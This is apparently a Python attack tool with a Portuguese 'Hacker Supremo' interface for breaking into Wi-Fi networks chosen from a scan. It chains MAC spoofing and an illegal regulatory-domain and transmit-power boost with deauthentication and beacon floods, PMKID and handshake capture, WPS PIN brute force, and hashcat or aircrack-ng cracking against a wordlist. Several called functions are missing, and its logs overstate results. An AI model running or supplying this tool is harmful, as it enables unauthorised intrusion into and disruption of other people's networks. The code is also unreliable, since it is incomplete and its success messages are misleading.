import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA - HACKER SUPREMO (VETOR X - ÚLTIMA GERAÇÃO)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] Erro crítico: Dependências visuais ausentes.")
    exit(1)

console = Console()
WEB_CALLBACK = None

def supreme_log(msg, log_type="info"):
    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
    elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
    else: console.print(f"[bold cyan]{msg}[/bold cyan]")

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
    "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Fabricante Desconhecido")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO NÍVEL 10 (STARLINK). Defesas PMF Ativas. O ÚNICO método eficaz é o VETOR X (Ataque de Injeção de Beacon Ativo)."
        vulns.append("PMF/WPA3 Hybrid")
    else:
        advice = "Alvo detectado. Recomendado: VETOR X para quebra instantânea."
    return vulns, advice

def test_injection(interface):
    supreme_log(f"Testando hardware {interface}...", log_type="cmd")
    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
    if stdout and "Injection is working!" in stdout:
        supreme_log("HARDWARE VALIDADO PARA COMBATE.")
        return True
    supreme_log("HARDWARE LIMITADO: Injeção falhou. Apenas ataques passivos funcionarão.", log_type="error")
    return False

def boost_signal(interface):
    run_command("iw reg set BO", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except: return None, ""

def check_aircrack_ng():
    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite"]
    for f in ferramentas:
        stdout, _ = run_command(f"dpkg -s {f}")
        if not (stdout and "install ok installed" in stdout):
            run_command(f"apt update && apt install -y {f}", sudo=True)
    return True

def set_monitor_mode(interface):
    supreme_log(f"Armando interface {interface}...", log_type="cmd")
    run_command("rfkill unblock all", sudo=True)
    run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
    run_command("airmon-ng check kill", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -r {interface}", sudo=True)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command(f"airmon-ng start {interface}", sudo=True)
    stdout_iw, _ = run_command("iw dev")
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current:
            test_injection(current)
            return current
    return interface

def set_managed_mode(interface):
    supreme_log("Desarmando sistema...", log_type="cmd")
    run_command(f"airmon-ng stop {interface}", sudo=True)
    run_command(f"macchanger -p {interface}", sudo=True)
    run_command("systemctl start NetworkManager", sudo=True)
    run_command("nmcli networking on", sudo=True)

def capture_vetor_x(monitor_interface, bssid, channel, output_file):
    supreme_log(f"ATIVANDO VETOR X (INCURSÃO TOTAL) contra {bssid}...", log_type="cmd")
    pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
    supreme_log("Injetando Beacons Ativos e Probe Requests (Força Bruta de Camada 2)...")
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(120); proc.terminate()
    except: pass
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
            supreme_log("VITÓRIA TÁTICA: O VETOR X EXTRAIU A CHAVE!")
            return hashf
    return None

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    supreme_log("Iniciando Extração PMKID Stealth...", log_type="cmd")
    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file):
    supreme_log("Iniciando Deauth Agressivo (MDK4)...", log_type="cmd")
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    for attempt in range(1, 4):
        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
        else: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(40):
            time.sleep(1)
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: break
    dump_proc.terminate(); return cap_file if handshake_found else None

def capture_wps(monitor_interface, bssid, channel):
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        return "WPS PIN" in res.stdout
    except: return False

def start_ghost_attack(interface, essid):
    cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass

def start_wifite_expert(interface):
    cmd = f"sudo wifite -i {interface} --kill --dict /usr/share/wordlists/rockyou.txt"
    try: subprocess.run(cmd, shell=True)
    except: pass

def start_evil_twin(interface, essid):
    supreme_log("Evil Twin requer configuração externa (Airgeddon recomendada).", log_type="info")

def scan_networks(monitor_interface):
    boost_signal(monitor_interface)
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    try: subprocess.run(f"sudo airodump-ng --band abg --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if in_ap and not row[0].strip() == "Station MAC":
                    bssid = row[0].strip(); essid = row[13].strip()
                    if essid and essid != "\x00":
                        networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
                elif row[0].strip() == "Station MAC": break
    if not networks: return None
    table = Table(title="RASTREAMENTO")
    table.add_column("ID"); table.add_column("Vendedor"); table.add_column("ESSID")
    for i, net in enumerate(networks): table.add_row(str(i+1), net['vendor'], net['essid'])
    console.print(table)
    choice = IntPrompt.ask("Escolha", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
    supreme_log(f"DSI INTEL: {advice}")
    console.print("[1] VETOR X\n[2] WIFITE2\n[3] Handshake\n[4] Ghost")
    atk_c = Prompt.ask("Vetor", choices=["1","2","3","4"], default="1")
    target['attack_type'] = {'1':'vetorx','2':'wifite','3':'handshake','4':'ghost'}[atk_c]
    return target

def main():
    if os.geteuid() != 0: return
    while True:
        os.system("clear"); print_banner()
        console.print("\n[1] Incursão HACKER SUPREMO\n[2] Wi-Fi 6 Doctor\n[3] Sair")
        opcao = Prompt.ask("Ação", choices=["1","2","3"])
        if opcao == '3': return
        elif opcao == '2': fix_drivers_wifi6(); continue
        elif opcao == '1': break
    check_aircrack_ng()
    iface = get_wifi_interface()
    if not iface: return
    mon = set_monitor_mode(iface)
    try:
        target = scan_networks(mon)
        if not target: return
        prefix = f"capture_{target['essid']}"
        if target['attack_type'] == 'vetorx': cap = capture_vetor_x(mon, target['bssid'], target['channel'], prefix)
        elif target['attack_type'] == 'wifite': start_wifite_expert(mon); return
        elif target['attack_type'] == 'ghost': start_ghost_attack(mon, target['essid']); return
        else: cap = capture_handshake(mon, target['bssid'], target['channel'], prefix)
        if cap:
            wordlist = Prompt.ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
            crack_hash(cap, wordlist, target['bssid'])
    finally: set_managed_mode(mon)

def crack_hash(hash_file, wordlist_file, bssid=None):
    if not os.path.exists(wordlist_file): return
    cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try: subprocess.run(cmd, shell=True)
    except: pass

if __name__ == "__main__": main()
